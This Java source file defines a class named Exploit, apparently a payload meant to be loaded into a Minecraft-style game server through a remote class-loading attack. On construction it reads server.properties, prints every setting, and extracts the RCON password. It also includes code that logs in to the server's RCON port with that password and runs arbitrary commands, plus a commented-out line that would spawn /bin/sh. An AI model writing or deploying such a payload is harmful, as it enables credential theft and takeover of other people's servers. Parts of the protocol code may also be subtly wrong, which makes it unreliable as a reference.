import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Properties;

public class Exploit {

    public Exploit() throws Exception {
        new Thread(() -> {
            try {
                // java.lang.Process p = new java.lang.ProcessBuilder("/bin/sh").start();
                loadProperties();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    public static RconCredential loadProperties() throws Exception {
        // Load server.properties
        Properties props = new Properties();
        RconCredential cred = new RconCredential();

        try (FileInputStream fis = new FileInputStream("server.properties")) {
            props.load(fis);
        }
        System.out.println(props);

        String host = "127.0.0.1";
        int port = Integer.parseInt(props.getProperty("rcon.port", "25575"));
        String password = props.getProperty("rcon.password");
        if (password == null || password.isEmpty()) {
            System.err.println("Missing rcon.password in server.properties");
            return null;
        }

        cred.host = host;
        cred.port = port;
        cred.password = password;
        return cred;
    }

    public static void executeRcon(RconCredential cred, String command) throws Exception {
        try (Socket socket = new Socket(cred.host, cred.port)) {
            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
            DataInputStream in = new DataInputStream(socket.getInputStream());

            int requestId = 1;

            // Auth packet (type 3)
            sendPacket(out, requestId, 3, cred.password);
            if (readResponseId(in) == -1) {
                System.err.println("RCON login failed.");
                return;
            }

            // Command packet (type 2)
            sendPacket(out, requestId, 2, command);
            String result = readResponse(in);
            System.out.println("RCON response:\n" + result);
        }
    }

    private static void sendPacket(DataOutputStream out, int requestId, int type, String payload) throws IOException {
        byte[] payloadBytes = payload.getBytes(StandardCharsets.UTF_8);
        int length = 4 + 4 + payloadBytes.length + 2;

        out.writeInt(length);
        out.writeInt(requestId);
        out.writeInt(type);
        out.write(payloadBytes);
        out.writeByte(0); // String null terminator
        out.writeByte(0); // Second null byte
        out.flush();
    }

    private static int readResponseId(DataInputStream in) throws IOException {
        int length = in.readInt();
        int id = in.readInt();
        in.skipBytes(length - 4); // skip type + payload
        return id;
    }

    private static String readResponse(DataInputStream in) throws IOException {
        int length = in.readInt();
        int id = in.readInt();
        int type = in.readInt();

        byte[] payload = new byte[length - 8]; // minus id and type
        in.readFully(payload);
        return new String(payload, StandardCharsets.UTF_8).trim();
    }

    static class RconCredential {
        String host = "localhost";
        int port;
        String password;
    }
}
